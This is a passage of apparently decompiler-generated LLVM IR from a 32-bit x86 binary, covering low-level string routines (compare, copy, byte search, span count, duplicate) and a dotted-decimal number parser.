  %v0_8056599.pre = load i32, i32* @esi, align 4
  %v1_8056599 = add i32 %v0_8056599.pre, -1
  %v8_8056599 = icmp eq i32 %v1_8056599, 0
  store i32 %v1_8056599, i32* @esi, align 4
  %v1_805659a = icmp eq i1 %v8_8056599, false
  br i1 %v1_805659a, label %dec_label_pc_8056597.dec_label_pc_8056599_crit_edge.dec_label_pc_8056563_crit_edge, label %dec_label_pc_805659c

dec_label_pc_8056597.dec_label_pc_8056599_crit_edge.dec_label_pc_8056563_crit_edge: ; preds = %dec_label_pc_8056597.dec_label_pc_8056599_crit_edge
  %v0_8056563.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8056563

dec_label_pc_805659c:                             ; preds = %dec_label_pc_8056599.preheader, %dec_label_pc_805656b, %dec_label_pc_8056597.dec_label_pc_8056599_crit_edge, %dec_label_pc_8056597, %dec_label_pc_805658a
  %v0_805659c = load i32, i32* @ebx, align 4
  %v1_805659c = load i32, i32* @edi, align 4
  %tmp27 = icmp ugt i32 %v0_805659c, %v1_805659c
  br i1 %tmp27, label %dec_label_pc_80565a0, label %dec_label_pc_80565a5

dec_label_pc_80565a0:                             ; preds = %dec_label_pc_805659c
  %v1_80565a0 = inttoptr i32 %v0_805659c to i8*
  store i8 0, i8* %v1_80565a0, align 1
  %v0_80565aa.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80565a7

dec_label_pc_80565a5:                             ; preds = %dec_label_pc_805659c, %dec_label_pc_805658a, %dec_label_pc_8056548
  br label %dec_label_pc_80565a7

dec_label_pc_80565a7:                             ; preds = %dec_label_pc_80565a0, %dec_label_pc_80565a5
  %v0_80565aa = phi i32 [ %v0_80565aa.pre, %dec_label_pc_80565a0 ], [ 0, %dec_label_pc_80565a5 ]
  store i32 %v0_80565aa, i32* %eax.global-to-local, align 4
  store i32 %v0_8056548, i32* @ebp, align 4
  ret i32 %v0_80565aa

; uselistorder directives
  uselistorder i32 %v0_80565aa, { 1, 0 }
  uselistorder i32 %v0_805659c, { 1, 0 }
  uselistorder i32 %v1_8056599, { 1, 0 }
  uselistorder i32 %v0_805657d, { 0, 2, 1 }
  uselistorder i32 %v0_8056563, { 1, 0 }
  uselistorder i8 10, { 0, 1, 2, 3, 4, 11, 5, 12, 10, 6, 7, 8, 9, 13 }
  uselistorder label %dec_label_pc_80565a7, { 1, 0 }
  uselistorder label %dec_label_pc_805659c, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_8056597.dec_label_pc_8056599_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8056563, { 1, 0 }
}

define i32 @function_80565b4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80565b4:
  %v4_80565b6 = ptrtoint i8* %arg1 to i32
  %v4_80565be.pre = load i32, i32* @eax, align 4
  %v8_80565be.pre = load i1, i1* @df, align 1
  %v9_80565be = select i1 %v8_80565be.pre, i32 -1, i32 1
  br label %dec_label_pc_80565be

dec_label_pc_80565be:                             ; preds = %dec_label_pc_80565c2, %dec_label_pc_80565b4
  %v20_80565bf = phi i32 [ %v23_80565bf, %dec_label_pc_80565c2 ], [ %arg2, %dec_label_pc_80565b4 ]
  %v4_80565be = phi i32 [ %v6_80565be, %dec_label_pc_80565c2 ], [ %v4_80565be.pre, %dec_label_pc_80565b4 ]
  %v7_80565be = phi i32 [ %v10_80565be, %dec_label_pc_80565c2 ], [ %v4_80565b6, %dec_label_pc_80565b4 ]
  %v1_80565be = inttoptr i32 %v7_80565be to i8*
  %v2_80565be = load i8, i8* %v1_80565be, align 1
  %v3_80565bf = inttoptr i32 %v20_80565bf to i8*
  %v4_80565bf = load i8, i8* %v3_80565bf, align 1
  %v15_80565bf = icmp eq i8 %v2_80565be, %v4_80565bf
  %v1_80565c0 = icmp eq i1 %v15_80565bf, false
  br i1 %v1_80565c0, label %dec_label_pc_80565ca, label %dec_label_pc_80565c2

dec_label_pc_80565c2:                             ; preds = %dec_label_pc_80565be
  %v23_80565bf = add i32 %v20_80565bf, %v9_80565be
  %v10_80565be = add i32 %v7_80565be, %v9_80565be
  %v3_80565be = zext i8 %v2_80565be to i32
  %v5_80565be = and i32 %v4_80565be, -256
  %v6_80565be = or i32 %v3_80565be, %v5_80565be
  %v4_80565c2 = icmp eq i8 %v2_80565be, 0
  %v1_80565c4 = icmp eq i1 %v4_80565c2, false
  br i1 %v1_80565c4, label %dec_label_pc_80565be, label %dec_label_pc_80565ce

dec_label_pc_80565ca:                             ; preds = %dec_label_pc_80565be
  br label %dec_label_pc_80565ce

dec_label_pc_80565ce:                             ; preds = %dec_label_pc_80565c2, %dec_label_pc_80565ca
  %storemerge = phi i32 [ 1, %dec_label_pc_80565ca ], [ 0, %dec_label_pc_80565c2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_80565be, { 1, 2, 0 }
  uselistorder i32 %v9_80565be, { 1, 0 }
  uselistorder label %dec_label_pc_80565ce, { 1, 0 }
}

define i32 @function_80565d4() local_unnamed_addr {
dec_label_pc_80565d4:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80565d7 = load i32, i32* @esi, align 4
  store i32 %v0_80565d7, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_80565db = ptrtoint i8* %tmp5 to i32
  store i32 %v4_80565db, i32* %esi.global-to-local, align 4
  %v4_80565e3 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_80565e7 = call i32 @_strlen(i8* %v4_80565e3)
  %v2_80565e9 = add i32 %tmp, -1
  store i32 %v2_80565e9, i32* %edi.global-to-local, align 4
  %v8_80565ed13 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_80565ed13, label %dec_label_pc_80565f8, label %dec_label_pc_80565f0.lr.ph

dec_label_pc_80565f0.lr.ph:                       ; preds = %dec_label_pc_80565d4
  %v4_80565f0.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_80565f0.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_80565f0

dec_label_pc_80565f0:                             ; preds = %dec_label_pc_80565f0.lr.ph, %dec_label_pc_80565f0.dec_label_pc_80565ed_crit_edge
  %v8_80565f0 = phi i1 [ %v8_80565f0.pre, %dec_label_pc_80565f0.lr.ph ], [ %v5_80565f1, %dec_label_pc_80565f0.dec_label_pc_80565ed_crit_edge ]
  %v4_80565f0 = phi i32 [ %v4_80565f0.pre, %dec_label_pc_80565f0.lr.ph ], [ %v0_80565f2, %dec_label_pc_80565f0.dec_label_pc_80565ed_crit_edge ]
  %v2_80565fa15 = phi i32 [ %v2_80565e9, %dec_label_pc_80565f0.lr.ph ], [ %v7_80565f1, %dec_label_pc_80565f0.dec_label_pc_80565ed_crit_edge ]
  %v0_80565f0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80565f0 = inttoptr i32 %v0_80565f0 to i8*
  %v2_80565f0 = load i8, i8* %v1_80565f0, align 1
  %v3_80565f0 = zext i8 %v2_80565f0 to i32
  %v5_80565f0 = and i32 %v4_80565f0, -256
  %v6_80565f0 = or i32 %v5_80565f0, %v3_80565f0
  store i32 %v6_80565f0, i32* %eax.global-to-local, align 4
  %v9_80565f0 = select i1 %v8_80565f0, i32 -1, i32 1
  %v10_80565f0 = add i32 %v9_80565f0, %v0_80565f0
  store i32 %v10_80565f0, i32* %esi.global-to-local, align 4
  %v3_80565f1 = inttoptr i32 %v2_80565fa15 to i8*
  store i8 %v2_80565f0, i8* %v3_80565f1, align 1
  %v4_80565f1 = load i32, i32* %edi.global-to-local, align 4
  %v5_80565f1 = load i1, i1* @df, align 1
  %v6_80565f1 = select i1 %v5_80565f1, i32 -1, i32 1
  %v7_80565f1 = add i32 %v6_80565f1, %v4_80565f1
  store i32 %v7_80565f1, i32* %edi.global-to-local, align 4
  %v0_80565f2 = load i32, i32* %eax.global-to-local, align 4
  %v3_80565f2 = trunc i32 %v0_80565f2 to i8
  %v4_80565f2 = icmp eq i8 %v3_80565f2, 0
  %v1_80565f4 = icmp eq i1 %v4_80565f2, false
  br i1 %v1_80565f4, label %dec_label_pc_80565f0.dec_label_pc_80565ed_crit_edge, label %dec_label_pc_80565fb

dec_label_pc_80565f0.dec_label_pc_80565ed_crit_edge: ; preds = %dec_label_pc_80565f0
  %v0_80565ed.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_80565ed = add i32 %v0_80565ed.pre, -1
  %v8_80565ed = icmp eq i32 %v1_80565ed, 0
  store i32 %v1_80565ed, i32* %ecx.global-to-local, align 4
  br i1 %v8_80565ed, label %dec_label_pc_80565f8, label %dec_label_pc_80565f0

dec_label_pc_80565f8:                             ; preds = %dec_label_pc_80565f0.dec_label_pc_80565ed_crit_edge, %dec_label_pc_80565d4
  %v2_80565fa.lcssa = phi i32 [ %v2_80565e9, %dec_label_pc_80565d4 ], [ %v7_80565f1, %dec_label_pc_80565f0.dec_label_pc_80565ed_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_80565fa = inttoptr i32 %v2_80565fa.lcssa to i8*
  store i8 0, i8* %v3_80565fa, align 1
  %v4_80565fa = load i32, i32* %edi.global-to-local, align 4
  %v5_80565fa = load i1, i1* @df, align 1
  %v6_80565fa = select i1 %v5_80565fa, i32 -1, i32 1
  %v7_80565fa = add i32 %v6_80565fa, %v4_80565fa
  store i32 %v7_80565fa, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80565fb

dec_label_pc_80565fb:                             ; preds = %dec_label_pc_80565f0, %dec_label_pc_80565f8
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_80565ff = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80565ff, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_80565ed, { 1, 0 }
  uselistorder i32 %v0_80565f2, { 1, 0 }
  uselistorder i32 %v7_80565f1, { 0, 2, 1 }
  uselistorder i1 %v5_80565f1, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80565fb, { 1, 0 }
  uselistorder label %dec_label_pc_80565f0, { 1, 0 }
}

define i32 @function_8056604(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8056604:
  %v0_8056605 = load i32, i32* @ebx, align 4
  %v4_8056606 = urem i32 %arg2, 256
  %v4_805660a = ptrtoint i8* %arg1 to i32
  %v2_80566153 = urem i32 %v4_805660a, 4
  %v3_80566154 = icmp eq i32 %v2_80566153, 0
  %v1_80566178 = icmp eq i1 %v3_80566154, false
  %v4_8056610 = trunc i32 %arg2 to i8
  br i1 %v1_80566178, label %dec_label_pc_8056610, label %dec_label_pc_8056619

dec_label_pc_8056610:                             ; preds = %dec_label_pc_8056604, %dec_label_pc_8056614
  %v0_8056614 = phi i32 [ %v1_8056614, %dec_label_pc_8056614 ], [ %v4_805660a, %dec_label_pc_8056604 ]
  %v1_8056610 = inttoptr i32 %v0_8056614 to i8*
  %v2_8056610 = load i8, i8* %v1_8056610, align 1
  %v15_8056610 = icmp eq i8 %v2_8056610, %v4_8056610
  br i1 %v15_8056610, label %dec_label_pc_8056664, label %dec_label_pc_8056614

dec_label_pc_8056614:                             ; preds = %dec_label_pc_8056610
  %v1_8056614 = add i32 %v0_8056614, 1
  %v2_8056615 = urem i32 %v1_8056614, 4
  %v3_8056615 = icmp eq i32 %v2_8056615, 0
  %v1_8056617 = icmp eq i1 %v3_8056615, false
  br i1 %v1_8056617, label %dec_label_pc_8056610, label %dec_label_pc_8056619

dec_label_pc_8056619:                             ; preds = %dec_label_pc_8056604, %dec_label_pc_8056614
  %v0_805661c = phi i32 [ %v1_8056614, %dec_label_pc_8056614 ], [ %v4_805660a, %dec_label_pc_8056604 ]
  %v2_8056620 = mul nuw nsw i32 %v4_8056606, 256
  %v2_8056623 = or i32 %v2_8056620, %v4_8056606
  %v2_8056627 = mul i32 %v2_8056623, 65536
  %v2_805662a = or i32 %v2_8056627, %v2_8056623
  br label %dec_label_pc_805662c

dec_label_pc_805662c:                             ; preds = %dec_label_pc_805665c, %dec_label_pc_805662c, %dec_label_pc_8056619
  %v0_8056630 = phi i32 [ %v0_805661c, %dec_label_pc_8056619 ], [ %v1_8056630, %dec_label_pc_805662c ], [ %v1_8056630, %dec_label_pc_805665c ]
  %v2_805662e = inttoptr i32 %v0_8056630 to i32*
  %v3_805662e = load i32, i32* %v2_805662e, align 4
  %v4_805662e = xor i32 %v3_805662e, %v2_805662a
  %v1_8056630 = add i32 %v0_8056630, 4
  %v1_8056633 = add i32 %v4_805662e, 2130640639
  %v1_8056639 = sub i32 -1, %v4_805662e
  %v2_805663b = xor i32 %v1_8056633, %v1_8056639
  %v1_805663d = and i32 %v2_805663b, -2130640640
  %v2_805663d = icmp eq i32 %v1_805663d, 0
  br i1 %v2_805663d, label %dec_label_pc_805662c, label %dec_label_pc_8056644

dec_label_pc_8056644:                             ; preds = %dec_label_pc_805662c
  %v2_8056644 = inttoptr i32 %v0_8056630 to i8*
  %v3_8056644 = load i8, i8* %v2_8056644, align 1
  %v16_8056644 = icmp eq i8 %v3_8056644, %v4_8056610
  br i1 %v16_8056644, label %dec_label_pc_8056664, label %dec_label_pc_805664c

dec_label_pc_805664c:                             ; preds = %dec_label_pc_8056644
  %v1_805664c = add i32 %v0_8056630, 1
  %v2_805664c = inttoptr i32 %v1_805664c to i8*
  %v3_805664c = load i8, i8* %v2_805664c, align 1
  %v16_805664c = icmp eq i8 %v3_805664c, %v4_8056610
  br i1 %v16_805664c, label %dec_label_pc_8056664, label %dec_label_pc_8056654

dec_label_pc_8056654:                             ; preds = %dec_label_pc_805664c
  %v1_8056654 = add i32 %v0_8056630, 2
  %v2_8056654 = inttoptr i32 %v1_8056654 to i8*
  %v3_8056654 = load i8, i8* %v2_8056654, align 1
  %v16_8056654 = icmp eq i8 %v3_8056654, %v4_8056610
  br i1 %v16_8056654, label %dec_label_pc_8056664, label %dec_label_pc_805665c

dec_label_pc_805665c:                             ; preds = %dec_label_pc_8056654
  %v1_805665c = add i32 %v0_8056630, 3
  %v2_805665c = inttoptr i32 %v1_805665c to i8*
  %v3_805665c = load i8, i8* %v2_805665c, align 1
  %v16_805665c = icmp eq i8 %v3_805665c, %v4_8056610
  %v1_8056662 = icmp eq i1 %v16_805665c, false
  br i1 %v1_8056662, label %dec_label_pc_805662c, label %dec_label_pc_8056664

dec_label_pc_8056664:                             ; preds = %dec_label_pc_8056610, %dec_label_pc_805665c, %dec_label_pc_8056654, %dec_label_pc_805664c, %dec_label_pc_8056644
  %v0_8056666 = phi i32 [ %v1_805665c, %dec_label_pc_805665c ], [ %v1_8056654, %dec_label_pc_8056654 ], [ %v1_805664c, %dec_label_pc_805664c ], [ %v0_8056630, %dec_label_pc_8056644 ], [ %v0_8056614, %dec_label_pc_8056610 ]
  store i32 %v0_8056605, i32* @ebx, align 4
  ret i32 %v0_8056666

; uselistorder directives
  uselistorder i32 %v1_8056630, { 1, 0 }
  uselistorder i32 %v2_8056623, { 1, 0 }
  uselistorder i32 %v1_8056614, { 1, 0, 2 }
  uselistorder i8 %v4_8056610, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_805660a, { 2, 1, 0 }
  uselistorder i32 %v4_8056606, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8056664, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8056619, { 1, 0 }
  uselistorder label %dec_label_pc_8056610, { 1, 0 }
}

define i32 @function_8056668(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8056668:
  %v2_805668a31 = load i8, i8* %arg1, align 1
  %v4_805668c35 = icmp eq i8 %v2_805668a31, 0
  br i1 %v4_805668c35, label %dec_label_pc_8056694, label %dec_label_pc_8056690.lr.ph

dec_label_pc_8056690.lr.ph:                       ; preds = %dec_label_pc_8056668
  %v3_805668a32 = zext i8 %v2_805668a31 to i32
  %v4_805668a.pre = load i32, i32* @eax, align 4
  %v5_805668a33 = and i32 %v4_805668a.pre, -256
  %v6_805668a34 = or i32 %v3_805668a32, %v5_805668a33
  %v4_8056671 = ptrtoint i8* %arg1 to i32
  %v1_805667c18 = inttoptr i32 %arg2 to i8*
  %v4_805667c.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056690

dec_label_pc_8056677:                             ; preds = %dec_label_pc_8056690, %dec_label_pc_805667b
  %v6_805667c28 = phi i32 [ %v6_805667c, %dec_label_pc_805667b ], [ %v6_805667c22, %dec_label_pc_8056690 ]
  %v2_805667c27 = phi i8 [ %v2_805667c, %dec_label_pc_805667b ], [ %v2_805667c19, %dec_label_pc_8056690 ]
  %v0_805667b26 = phi i32 [ %v1_805667b, %dec_label_pc_805667b ], [ %arg2, %dec_label_pc_8056690 ]
  %v15_8056677 = icmp eq i8 %v2_805668a39, %v2_805667c27
  br i1 %v15_8056677, label %dec_label_pc_8056684, label %dec_label_pc_805667b

dec_label_pc_805667b:                             ; preds = %dec_label_pc_8056677
  %v1_805667b = add i32 %v0_805667b26, 1
  store i32 %v1_805667b, i32* @edx, align 4
  %v1_805667c = inttoptr i32 %v1_805667b to i8*
  %v2_805667c = load i8, i8* %v1_805667c, align 1
  %v3_805667c = zext i8 %v2_805667c to i32
  %v5_805667c = and i32 %v6_805667c28, -256
  %v6_805667c = or i32 %v3_805667c, %v5_805667c
  store i32 %v6_805667c, i32* @ecx, align 4
  %v4_805667e = icmp eq i8 %v2_805667c, 0
  %v1_8056680 = icmp eq i1 %v4_805667e, false
  br i1 %v1_8056680, label %dec_label_pc_8056677, label %dec_label_pc_8056694

dec_label_pc_8056684:                             ; preds = %dec_label_pc_8056677
  %v1_8056688 = add i32 %v0_805669537, 1
  %v1_8056689 = add i32 %v0_805668938, 1
  %v1_805668a = inttoptr i32 %v1_8056689 to i8*
  %v2_805668a = load i8, i8* %v1_805668a, align 1
  %v3_805668a = zext i8 %v2_805668a to i32
  %v5_805668a = and i32 %v6_805668a40, -256
  %v6_805668a = or i32 %v3_805668a, %v5_805668a
  %v4_805668c = icmp eq i8 %v2_805668a, 0
  br i1 %v4_805668c, label %dec_label_pc_8056694, label %dec_label_pc_8056690

dec_label_pc_8056690:                             ; preds = %dec_label_pc_8056690.lr.ph, %dec_label_pc_8056684
  %v4_805667c.pre = phi i32 [ %v4_805667c.pre.pre, %dec_label_pc_8056690.lr.ph ], [ %v6_805667c28, %dec_label_pc_8056684 ]
  %v6_805668a40 = phi i32 [ %v6_805668a34, %dec_label_pc_8056690.lr.ph ], [ %v6_805668a, %dec_label_pc_8056684 ]
  %v2_805668a39 = phi i8 [ %v2_805668a31, %dec_label_pc_8056690.lr.ph ], [ %v2_805668a, %dec_label_pc_8056684 ]
  %v0_805668938 = phi i32 [ %v4_8056671, %dec_label_pc_8056690.lr.ph ], [ %v1_8056689, %dec_label_pc_8056684 ]
  %v0_805669537 = phi i32 [ 0, %dec_label_pc_8056690.lr.ph ], [ %v1_8056688, %dec_label_pc_8056684 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805667c19 = load i8, i8* %v1_805667c18, align 1
  %v3_805667c20 = zext i8 %v2_805667c19 to i32
  %v5_805667c21 = and i32 %v4_805667c.pre, -256
  %v6_805667c22 = or i32 %v3_805667c20, %v5_805667c21
  store i32 %v6_805667c22, i32* @ecx, align 4
  %v4_805667e23 = icmp eq i8 %v2_805667c19, 0
  %v1_805668025 = icmp eq i1 %v4_805667e23, false
  br i1 %v1_805668025, label %dec_label_pc_8056677, label %dec_label_pc_8056694

dec_label_pc_8056694:                             ; preds = %dec_label_pc_8056668, %dec_label_pc_8056684, %dec_label_pc_8056690, %dec_label_pc_805667b
  %v0_805669517 = phi i32 [ %v0_805669537, %dec_label_pc_805667b ], [ %v0_805669537, %dec_label_pc_8056690 ], [ 0, %dec_label_pc_8056668 ], [ %v1_8056688, %dec_label_pc_8056684 ]
  ret i32 %v0_805669517

; uselistorder directives
  uselistorder i32 %v6_805667c22, { 1, 0 }
  uselistorder i8 %v2_805667c19, { 1, 2, 0 }
  uselistorder i32 %v1_8056689, { 1, 0 }
  uselistorder i32 %v6_805667c, { 1, 0 }
  uselistorder i8 %v2_805667c, { 1, 2, 0 }
  uselistorder i32 %v1_805667b, { 2, 1, 0 }
  uselistorder i8 %v2_805668a31, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056694, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8056690, { 1, 0 }
}

define i32 @function_805669c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805669c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805669c = load i32, i32* @edi, align 4
  %v0_805669d = load i32, i32* @esi, align 4
  %v0_805669e = load i32, i32* @ebx, align 4
  store i32 %v0_805669e, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80566a7 = inttoptr i32 %arg1 to i8*
  %v2_80566a7 = call i32 @function_8051ef8(i8* %v1_80566a7)
  %v1_80566ac = add i32 %v2_80566a7, 1
  store i32 %v1_80566ac, i32* @esi, align 4
  %v1_80566b2 = call i32 @function_80529ba(i32 %v1_80566ac)
  %v1_80566ba = icmp eq i32 %v1_80566b2, 0
  store i32 %v1_80566b2, i32* %ebx.global-to-local, align 4
  br i1 %v1_80566ba, label %dec_label_pc_80566cc, label %dec_label_pc_80566c0

dec_label_pc_80566c0:                             ; preds = %dec_label_pc_805669c
  %v0_80566c1 = load i32, i32* @esi, align 4
  %v0_80566c2 = load i32, i32* @edi, align 4
  %v3_80566c4 = inttoptr i32 %v1_80566b2 to i16*
  %v4_80566c4 = call i32 @function_8051e5c(i16* %v3_80566c4, i32 %v0_80566c2, i32 %v0_80566c1)
  %v0_80566cc.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80566cc

dec_label_pc_80566cc:                             ; preds = %dec_label_pc_805669c, %dec_label_pc_80566c0
  %v0_80566cc = phi i32 [ 0, %dec_label_pc_805669c ], [ %v0_80566cc.pre, %dec_label_pc_80566c0 ]
  %v2_80566ce = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80566ce, i32* @ebx, align 4
  store i32 %v0_805669d, i32* @esi, align 4
  store i32 %v0_805669c, i32* @edi, align 4
  ret i32 %v0_80566cc

; uselistorder directives
  uselistorder i32 (i32)* @function_80529ba, { 5, 4, 3, 2, 0, 1, 10, 9, 8, 7, 6 }
  uselistorder label %dec_label_pc_80566cc, { 1, 0 }
}

define i32 @function_80566d4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80566d4:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_80566da = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_80566dd = load i32, i32* @ebx, align 4
  store i32 %v0_80566dd, i32* %stack_var_-16, align 4
  %v0_80566de = load i32, i32* @eax, align 4
  store i32 %v0_80566de, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_80566e0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_80566e3 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80566e3, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_805672b15 = inttoptr i32 %v0_80566de to i8*
  %v2_805672b16 = load i8, i8* %v1_805672b15, align 1
  %v3_805672b17 = sext i8 %v2_805672b16 to i32
  store i32 %v3_805672b17, i32* @ecx, align 4
  %v1_805672e18 = add i32 %v0_80566de, 1
  store i32 %v1_805672e18, i32* %ebx.global-to-local, align 4
  %v1_805672f19 = icmp eq i8 %v2_805672b16, 0
  store i1 %v1_805672f19, i1* %zf.global-to-local, align 1
  %v1_805673121 = icmp eq i1 %v1_805672f19, false
  br i1 %v1_805673121, label %dec_label_pc_80566ee, label %dec_label_pc_8056733

dec_label_pc_80566ee:                             ; preds = %dec_label_pc_80566d4, %dec_label_pc_805672b.backedge
  %v3_805672b23 = phi i32 [ %v3_805672b, %dec_label_pc_805672b.backedge ], [ %v3_805672b17, %dec_label_pc_80566d4 ]
  %v2_805672b22 = phi i8 [ %v2_805672b, %dec_label_pc_805672b.backedge ], [ %v2_805672b16, %dec_label_pc_80566d4 ]
  %v1_80566ee = add nsw i32 %v3_805672b23, -48
  store i32 %v1_80566ee, i32* @eax, align 4
  %v9_80566f1 = icmp eq i8 %v2_805672b22, 57
  store i1 %v9_80566f1, i1* %zf.global-to-local, align 1
  %v6_80566f4 = icmp ugt i32 %v1_80566ee, 9
  br i1 %v6_80566f4, label %dec_label_pc_8056717, label %dec_label_pc_80566f6

dec_label_pc_80566f6:                             ; preds = %dec_label_pc_80566ee
  %v0_80566f6 = load i32, i32* @esi, align 4
  %v1_80566f6 = inttoptr i32 %v0_80566f6 to i8*
  %v2_80566f6 = load i8, i8* %v1_80566f6, align 1
  %v2_80566f9 = zext i8 %v2_80566f6 to i32
  %v3_80566f9 = mul nuw nsw i32 %v2_80566f9, 10
  %v3_80566fc = add nsw i32 %v3_80566f9, %v1_80566ee
  store i32 %v3_80566fc, i32* @eax, align 4
  %v9_8056700 = icmp eq i32 %v3_80566fc, 255
  store i1 %v9_8056700, i1* %zf.global-to-local, align 1
  %v6_8056705 = icmp ugt i32 %v3_80566fc, 255
  br i1 %v6_8056705, label %dec_label_pc_8056750, label %dec_label_pc_8056707

dec_label_pc_8056707:                             ; preds = %dec_label_pc_80566f6
  %v0_8056707 = load i32, i32* @edx, align 4
  %v1_8056707 = icmp eq i32 %v0_8056707, 0
  store i1 %v1_8056707, i1* %zf.global-to-local, align 1
  %v1_8056709 = trunc i32 %v3_80566fc to i8
  store i8 %v1_8056709, i8* %v1_80566f6, align 1
  %v0_805670b = load i1, i1* %zf.global-to-local, align 1
  %v1_805670b = icmp eq i1 %v0_805670b, false
  br i1 %v1_805670b, label %dec_label_pc_805672b.backedge, label %dec_label_pc_805670d

dec_label_pc_805670d:                             ; preds = %dec_label_pc_8056707
  %v0_805670d = load i32, i32* @edi, align 4
  %v1_805670d = add i32 %v0_805670d, 1
  store i32 %v1_805670d, i32* @edi, align 4
  %v1_805670e = add i32 %v0_805670d, -3
  %v6_805670e = sub i32 2, %v0_805670d
  %v7_805670e = and i32 %v6_805670e, %v1_805670d
  %v8_805670e = icmp slt i32 %v7_805670e, 0
  %v9_805670e = icmp eq i32 %v1_805670e, 0
  store i1 %v9_805670e, i1* %zf.global-to-local, align 1
  %v10_805670e = icmp slt i32 %v1_805670e, 0
  %v3_8056711 = icmp eq i1 %v10_805670e, %v8_805670e
  %v4_8056711 = icmp eq i1 %v9_805670e, false
  %v5_8056711 = and i1 %v4_8056711, %v3_8056711
  br i1 %v5_8056711, label %dec_label_pc_8056750, label %dec_label_pc_8056713

dec_label_pc_8056713:                             ; preds = %dec_label_pc_805670d
  %v0_8056713 = load i32, i32* @edx, align 4
  %v1_8056713 = and i32 %v0_8056713, -256
  %v2_8056713 = or i32 %v1_8056713, 1
  store i32 %v2_8056713, i32* @edx, align 4
  br label %dec_label_pc_805672b.backedge

dec_label_pc_8056717:                             ; preds = %dec_label_pc_80566ee
  %v9_8056717 = icmp eq i8 %v2_805672b22, 46
  store i1 %v9_8056717, i1* %zf.global-to-local, align 1
  %v1_805671a = icmp eq i1 %v9_8056717, false
  br i1 %v1_805671a, label %dec_label_pc_8056750, label %dec_label_pc_805671c

dec_label_pc_805671c:                             ; preds = %dec_label_pc_8056717
  %v0_805671c = load i32, i32* @edx, align 4
  %v1_805671c = icmp eq i32 %v0_805671c, 0
  store i1 %v1_805671c, i1* %zf.global-to-local, align 1
  br i1 %v1_805671c, label %dec_label_pc_8056750, label %dec_label_pc_8056720

dec_label_pc_8056720:                             ; preds = %dec_label_pc_805671c
  %v0_8056720 = load i32, i32* @edi, align 4
  %v9_8056720 = icmp eq i32 %v0_8056720, 4
  store i1 %v9_8056720, i1* %zf.global-to-local, align 1
  br i1 %v9_8056720, label %dec_label_pc_8056750, label %dec_label_pc_8056725

dec_label_pc_8056725:                             ; preds = %dec_label_pc_8056720
  %v0_8056725 = load i32, i32* @esi, align 4
  %v1_8056725 = add i32 %v0_8056725, 1
  store i32 %v1_8056725, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_8056728 = inttoptr i32 %v1_8056725 to i8*
  store i8 0, i8* %v1_8056728, align 1
  br label %dec_label_pc_805672b.backedge

dec_label_pc_805672b.backedge:                    ; preds = %dec_label_pc_8056725, %dec_label_pc_8056713, %dec_label_pc_8056707
  %v0_805672b.pre = load i32, i32* %ebx.global-to-local, align 4
